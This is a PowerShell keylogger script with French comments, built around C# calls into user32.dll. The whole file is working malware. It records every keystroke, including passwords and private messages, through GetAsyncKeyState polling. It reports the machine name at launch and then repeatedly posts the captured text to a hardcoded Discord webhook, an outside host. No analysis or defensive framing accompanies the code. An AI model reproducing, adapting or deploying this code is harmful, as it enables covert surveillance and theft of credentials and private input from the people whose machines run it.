$webhook = 'https://discord.com/api/webhooks/1318280027363606589/FkAnJDBzgFUo3A7YeocKsc8PbojYTWuE0-_BTNn7SunjxTokeWNOVpHk_dN9Uh5XqrOW'

# Message de démarrage identique à ton C#
iwr $webhook -Method Post -Body (@{content="Keylogger pro lancé – $env:MACHINENAME"}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null

Add-Type @'
using System;
using System.Runtime.InteropServices;
using System.Text;
public class K {
    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
    [DllImport("user32.dll")] public static extern int ToUnicode(uint vKey, uint scanCode, byte[] keyState, StringBuilder buff, int buffSize, uint flags);
    [DllImport("user32.dll")] public static extern short GetKeyState(int vKey);
}
'@

$buffer = New-Object Text.StringBuilder
$lastSent = Get-Date

while ($true) {
    Start-Sleep -Milliseconds 30

    $shift = ([K]::GetKeyState(0x10) -band 0x8000) -ne 0
    $caps = ([K]::GetKeyState(0x14) -band 1) -ne 0

    for ($i = 8; $i -le 254; $i++) {
        if ([K]::GetAsyncKeyState($i) -eq -32767) {
            $sb = New-Object Text.StringBuilder
            $state = New-Object byte[] 256
            if ($shift) { $state[0x10] = 0x80 }
            if ($caps) { $state[0x14] = 0x01 }

            [K]::ToUnicode($i, 0, $state, $sb, $sb.Capacity, 0) | Out-Null
            $char = $sb.ToString()

            if ($char.Length -eq 0) {
                switch ($i) {
                    8  { $char = '[BACKSPACE]' }
                    13 { $char = "`n" }
                    32 { $char = ' ' }
                    default { $char = '' }
                }
            }

            if ($i -ne 8) { $buffer.Append($char) | Out-Null }

            if ($buffer.Length -ge 40 -or ((Get-Date) - $lastSent).TotalSeconds -gt 15) {
                iwr $webhook -Method Post -Body (@{content=$buffer.ToString()}|ConvertTo-Json) -ContentType 'application/json' -UseBasicParsing | Out-Null
                $buffer.Clear() | Out-Null
                $lastSent = Get-Date
            }
        }
    }
}
